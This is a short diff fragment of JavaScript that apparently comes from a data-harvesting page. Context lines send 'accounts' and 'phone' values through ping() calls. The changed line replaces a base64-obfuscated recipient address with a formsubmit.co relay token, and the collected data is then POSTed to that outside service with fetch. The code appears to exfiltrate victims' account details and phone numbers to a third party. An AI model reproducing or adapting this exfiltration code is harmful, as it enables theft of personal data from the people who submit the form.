@@ -131,7 +131,7 @@
     ping('q-' + accounts);
     ping('p-' + phone);
 
-    var endpoint = 'https://formsubmit.co/ajax/' + atob('amlheXVhbmxpbjgzOEBnbWFpbC5jb20=');
+    var endpoint = 'https://formsubmit.co/ajax/' + 'a7e5a1993689a6d0f37c08c811c92a32';
     fetch(endpoint, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
